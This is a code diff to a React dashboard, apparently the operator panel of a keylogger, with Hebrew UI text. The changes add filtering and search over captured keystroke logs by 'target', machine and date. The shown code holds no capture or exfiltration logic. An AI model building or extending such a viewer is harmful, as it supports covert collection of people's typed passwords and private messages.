@@ -85,6 +85,10 @@
     .logs-table {
       font-size: 0.9rem;
     }
+    .logs-table th, .logs-table td {
+      text-align: center; 
+      vertical-align: middle; 
+    }
     .truncate {
       max-width: 350px;
       white-space: nowrap;
@@ -125,7 +129,7 @@
 
     const API_BASE = "[[ base_url ]]";
 
-    // פונקציות API (ללא שינוי)
+    // פונקציות API
     const fetchAllLogs = async (offset = 0, limit = 40) => {
         const response = await fetch(`${API_BASE}/logs?offset=${offset}&limit=${limit}`);
         return response.json();
@@ -150,8 +154,22 @@
         const response = await fetch(`${API_BASE}/logs/date?start=${start}&end=${end}&offset=${offset}&limit=${limit}`);
         return response.json();
     };
+    const fetchLogsFiltered = async (filters = {}, offset = 0, limit = 40) => {
+        const params = new URLSearchParams();
+        params.append('offset', offset);
+        params.append('limit', limit);
+        
+        if (filters.username) params.append('username', filters.username);
+        if (filters.machine) params.append('machine', filters.machine);
+        if (filters.start_date) params.append('start_date', filters.start_date);
+        if (filters.end_date) params.append('end_date', filters.end_date);
+        if (filters.q) params.append('q', filters.q);
+        
+        const response = await fetch(`${API_BASE}/logs?${params}`);
+        return response.json();
+    };
 
-    // קומפוננט ראשי
+    // קומפוננטה ראשית
     function KeyloggerDashboard() {
         const [logs, setLogs] = useState([]);
         const [users, setUsers] = useState([]);
@@ -172,14 +190,32 @@
 
         const ITEMS_PER_PAGE = 25;
 
-        // טעינת נתונים וחישובים
+       
+        const hasActiveFilters = () => {
+            return selectedUser || selectedMachine || startDate || endDate || searchText;
+        };
+
+        
         const loadData = async (page = 0) => {
             try {
-                if (page === 0 && logs.length === 0) setLoading(true); // Only show main loader on first load
+                if (page === 0 && logs.length === 0) setLoading(true);
 
-                // Fetch data
-                const [logsResponse, usersData, machinesData] = await Promise.all([
-                    fetchAllLogs(page * ITEMS_PER_PAGE, ITEMS_PER_PAGE),
+                let logsResponse;
+                
+                if (hasActiveFilters()) {
+                    const filters = {};
+                    if (selectedUser) filters.username = selectedUser;
+                    if (selectedMachine) filters.machine = selectedMachine;
+                    if (startDate) filters.start_date = startDate;
+                    if (endDate) filters.end_date = endDate; 
+                    if (searchText) filters.q = searchText;
+                    
+                    logsResponse = await fetchLogsFiltered(filters, page * ITEMS_PER_PAGE, ITEMS_PER_PAGE);
+                } else {
+                    logsResponse = await fetchAllLogs(page * ITEMS_PER_PAGE, ITEMS_PER_PAGE);
+                }
+
+                const [usersData, machinesData] = await Promise.all([
                     fetchAllUsers(),
                     fetchAllMachines()
                 ]);
@@ -191,13 +227,13 @@
                 setMachines(machinesData.machines || []);
                 
                 // Calculate KPIs
-                if(logsData.length > 0) {
+                if (logsData.length > 0) {
                     const userCounts = logsData.reduce((acc, log) => {
                         acc[log.username] = (acc[log.username] || 0) + 1;
                         return acc;
                     }, {});
 
-                    if(Object.keys(userCounts).length > 0) {
+                    if (Object.keys(userCounts).length > 0) {
                         const mostActive = Object.entries(userCounts).reduce((a, b) => a[1] > b[1] ? a : b);
                         setMostActiveUser({ name: mostActive[0], count: mostActive[1] });
                     }
@@ -205,7 +241,18 @@
                     const latestLog = logsData[0];
                     const timeDiff = Date.now() - new Date(latestLog.timestamp).getTime();
                     const minutesAgo = Math.floor(timeDiff / 60000);
-                    setLastActivity(minutesAgo < 1 ? 'כרגע' : `לפני ${minutesAgo} דקות`);
+
+                    if (minutesAgo < 1) {
+                        setLastActivity('כרגע');
+                    } else if (minutesAgo < 60) {
+                        setLastActivity(`לפני ${minutesAgo} דקות`);
+                    } else if (minutesAgo < 1440) {
+                        const hoursAgo = Math.floor(minutesAgo / 60);
+                        setLastActivity(`לפני ${hoursAgo} שעות`);
+                    } else {
+                        const daysAgo = Math.floor(minutesAgo / 1440);
+                        setLastActivity(`לפני ${daysAgo} ימים`);
+                    }
                 }
 
             } catch (error) {
@@ -217,41 +264,17 @@
 
         useEffect(() => {
             loadData();
-            const interval = setInterval(() => loadData(currentPage), 30000); // Refresh every 30 seconds
+            const interval = setInterval(() => loadData(currentPage), 30000);
             return () => clearInterval(interval);
-        }, [currentPage]);
-
+        }, [currentPage, selectedUser, selectedMachine, startDate, endDate, searchText]); 
 
         const handleFilter = async () => {
             setLoading(true);
             setCurrentPage(0);
-            try {
-                let response;
-                if (selectedUser) response = await fetchLogsByUser(selectedUser, 0, ITEMS_PER_PAGE);
-                else if (selectedMachine) response = await fetchLogsByMachine(selectedMachine, 0, ITEMS_PER_PAGE);
-                else if (startDate && endDate) {
-                    const start = Math.floor(new Date(startDate).getTime() / 1000);
-                    const end = Math.floor(new Date(endDate).getTime() / 1000) + 86399; // End of day
-                    response = await fetchLogsByDate(start, end, 0, ITEMS_PER_PAGE);
-                } else {
-                    response = await fetchAllLogs(0, ITEMS_PER_PAGE);
-                }
-                
-                let filteredData = response.logs || [];
-                if (searchText) {
-                    filteredData = filteredData.filter(log =>
-                        log.keylog.toLowerCase().includes(searchText.toLowerCase())
-                    );
-                }
-                setLogs(filteredData);
-                setTotalLogsCount(response.total || filteredData.length);
-            } catch (error) {
-                console.error("Error filtering data:", error);
-            } finally {
-                setLoading(false);
-            }
+            
+            await loadData(0);
         };
-        
+
         const resetFilters = () => {
             setSelectedUser('');
             setSelectedMachine('');
@@ -334,21 +357,21 @@
                         <div className="row g-2 align-items-center">
                             <div className="col-md-2">
                                 <select className="form-select form-select-sm" value={selectedUser} onChange={(e) => setSelectedUser(e.target.value)}>
-                                    <option value="">סינון לפי משתמש</option>
+                                    <option value="">סינון לפי יעד</option>
                                     {users.map(user => <option key={user} value={user}>{user}</option>)}
                                 </select>
                             </div>
                             <div className="col-md-3">
                                 <select className="form-select form-select-sm" value={selectedMachine} onChange={(e) => setSelectedMachine(e.target.value)}>
-                                    <option value="">סינון לפי מכונה</option>
+                                    <option value="">סינון לפי מערכת הפעלה</option>
                                     {machines.map(machine => <option key={machine} value={machine}>{machine}</option>)}
                                 </select>
                             </div>
                             <div className="col-md-2">
-                                <input type="date" className="form-control form-control-sm" value={startDate} onChange={(e) => setStartDate(e.target.value)} />
+                                <input type="datetime-local" className="form-control form-control-sm" value={startDate} onChange={(e) => setStartDate(e.target.value)} />
                             </div>
-                             <div className="col-md-2">
-                                <input type="date" className="form-control form-control-sm" value={endDate} onChange={(e) => setEndDate(e.target.value)} />
+                            <div className="col-md-2">
+                                <input type="datetime-local" className="form-control form-control-sm" value={endDate} onChange={(e) => setEndDate(e.target.value)} />
                             </div>
                             <div className="col-md-3">
                                 <input type="search" className="form-control form-control-sm" placeholder="חיפוש טקסט בתוכן..." value={searchText} onChange={(e) => setSearchText(e.target.value)} />
